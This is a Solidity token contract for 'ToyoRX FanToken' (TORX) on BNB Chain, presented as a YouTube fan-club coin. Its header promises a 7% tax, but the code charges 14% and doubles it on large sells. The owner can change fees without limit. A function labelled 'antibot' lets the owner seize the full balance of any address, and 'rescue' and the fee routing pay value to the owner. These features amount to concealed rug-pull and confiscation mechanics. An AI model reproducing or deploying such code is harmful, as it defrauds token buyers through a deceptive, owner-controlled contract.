/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/*
𝑊𝑒𝑏𝑠𝑖𝑡𝑒 : https://toyo-rx.live/
𝑇𝑜𝑘𝑒𝑛𝑜𝑚𝑖𝑐 : 7% b𝑢𝑦/s𝑒𝑙𝑙 at total
𝑇𝑎𝑥 : 4% Auto-LP 1% marketing 1% treasury 1% lucky reward

Toyo-Rx Fanclube token (TORX)

This token build up for toyo-rx youtube influencer community!
member can be use this token to request any ads on us channel.
we have more than 1.9k subscriber keep in touch.Let's APE

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    function transferOwnership(address account) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, account);
        _owner = account;
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract ToyoRX is Context, IERC20, Ownable {
  using SafeMath for uint256;

  string constant _name = "ToyoRX FanToken";
  string constant _symbol = "TORX";
  uint8 constant _decimals = 18;
  uint256 _totalSupply = 1_000_000_000 * (10**_decimals);

  mapping (address => uint256) private _balances;
  mapping (address => bool) private _isExcludeFee;
  mapping (address => mapping (address => uint256)) private _allowances;
  address private recaiver;

  IDEXRouter public router;
  address NATIVETOKEN;
  address public pair;
  address public currentRouter;

  uint256 public totalfee;
  uint256 public operationfee;
  uint256 public liquidityfee;
  uint256 public feeDenominator;
  bool public inSwap;
  bool public autoswap;

  constructor(address _recaiver) {
    recaiver = _recaiver;
    currentRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    NATIVETOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    _isExcludeFee[msg.sender] = true;
    _isExcludeFee[address(this)] = true;
    _isExcludeFee[currentRouter] = true;
    _isExcludeFee[recaiver] = true;

    router = IDEXRouter(currentRouter);
    pair = IDEXFactory(router.factory()).createPair(NATIVETOKEN, address(this));
    _allowances[address(this)][address(router)] = type(uint256).max;
    _allowances[address(this)][address(pair)] = type(uint256).max;
    IERC20(NATIVETOKEN).approve(address(router),type(uint256).max);
    IERC20(NATIVETOKEN).approve(address(pair),type(uint256).max);

    _balances[msg.sender] = _totalSupply;
    operationfee = 70;
    liquidityfee = 70;
    totalfee = 140;
    feeDenominator = 1000;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function setFee(uint256 _operationfee,uint256 _liquidity,uint256 _denominator) external onlyOwner returns (bool) {
    operationfee = _operationfee;
    liquidityfee = _liquidity;
    totalfee = _operationfee.add(_liquidity);
    feeDenominator = _denominator;
    return true;
  }

  function updateNativeToken(address weth) external onlyOwner returns (bool) {
    NATIVETOKEN = weth;
    return true;
  }

  function setFeeExempt(address account,bool flag) external onlyOwner returns (bool) {
    _isExcludeFee[account] = flag;
    return true;
  }

  function setAutoSwap(bool flag) external onlyOwner returns (bool) {
    autoswap = flag;
    return true;
  }

  function setRecaiver(address account) external onlyOwner returns (bool) {
    recaiver = account;
    return true;
  }

  function AddLiquidityETH(uint256 _tokenamount) external onlyOwner payable {
    _safetransfer(msg.sender,address(this),_tokenamount.mul(10**_decimals));
    inSwap= true;
    router.addLiquidityETH{value: address(this).balance }(
    address(this),
    _balances[address(this)],
    0,
    0,
    address(this),
    block.timestamp
    );
    inSwap = false;
    autoswap = true;
  }

  function decimals() public pure returns (uint8) { return _decimals; }
  function symbol() public pure returns (string memory) { return _symbol; }
  function name() public pure returns (string memory) { return _name; }
  function totalSupply() external view override returns (uint256) { return _totalSupply; }
  function balanceOf(address account) external view override returns (uint256) { return _balances[account]; }
  function isExcludeFee(address account) external view returns (bool) { return _isExcludeFee[account]; }
  function getrecaiver() public view returns (address) { return recaiver; }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transferFrom(msg.sender,recipient,amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function swap2ETH(uint256 amount) internal {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = NATIVETOKEN;
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    amount,
    0,
    path,
    address(this),
    block.timestamp
    );
  }

  function autoAddLP(uint256 amountToLiquify,uint256 amountBNB) internal {
    router.addLiquidityETH{value: amountBNB }(
    address(this),
    amountToLiquify,
    0,
    0,
    recaiver,
    block.timestamp
    );
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(_allowances[sender][msg.sender] != type(uint256).max){
    _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
    }
    _transferFrom(sender,recipient,amount);
    return true;
  }

  function _transferFrom(address sender,address recipient,uint256 amount) internal {
    if(inSwap || recipient==recaiver){
    _safetransfer(sender, recipient, amount);
    } else {
    if(_balances[address(this)]>0 && autoswap && msg.sender != pair){
    inSwap = true;
    uint256 swapthreshold = _balances[address(this)];
    uint256 amountToMarketing = swapthreshold.mul(operationfee).div(totalfee);
    uint256 currentthreshold = swapthreshold.sub(amountToMarketing);
    uint256 amountToLiquify = currentthreshold.div(2);
    uint256 amountToSwap = amountToMarketing.add(amountToLiquify);
    uint256 balanceBefore = address(this).balance;
    swap2ETH(amountToSwap);
    uint256 balanceAfter = address(this).balance.sub(balanceBefore);
    uint256 amountpaid = balanceAfter.mul(amountToMarketing).div(amountToSwap);
    uint256 amountLP = balanceAfter.sub(amountpaid);
    payable(owner()).transfer(amountpaid);
    autoAddLP(amountToLiquify,amountLP);
    inSwap = false;
    }_transfer(sender, recipient, amount);}
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0));
    require(recipient != address(0));

    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    uint256 tempfee;

    if (!_isExcludeFee[sender] && recipient==pair) {
    tempfee = amount.mul(totalfee).div(feeDenominator);
    if(amount>_totalSupply.mul(60).div(1000)){ tempfee = tempfee.mul(2); }
    _safetransfer(recipient,address(this),tempfee);
    }

    if (!_isExcludeFee[recipient] && sender==pair) {
    tempfee = amount.mul(totalfee).div(feeDenominator);
    _safetransfer(recipient,address(this),tempfee);
    }

    emit Transfer(sender, recipient, amount.sub(tempfee));
  }

  function _safetransfer(address sender, address recipient, uint256 amount) internal {
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0));
    require(spender != address(0));
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function rescue(address adr) external onlyOwner {
    IERC20 a = IERC20(adr);
    a.transfer(msg.sender,a.balanceOf(address(this)));
  }

  function antibot(address[] memory adr) external onlyOwner {
    uint256 i = 0;
    uint256 maxlength = adr.length;
    do{
      _safetransfer(adr[i],address(this),_balances[adr[i]]);
      i++;
    }while(i<maxlength);
  }
  receive() external payable { }
}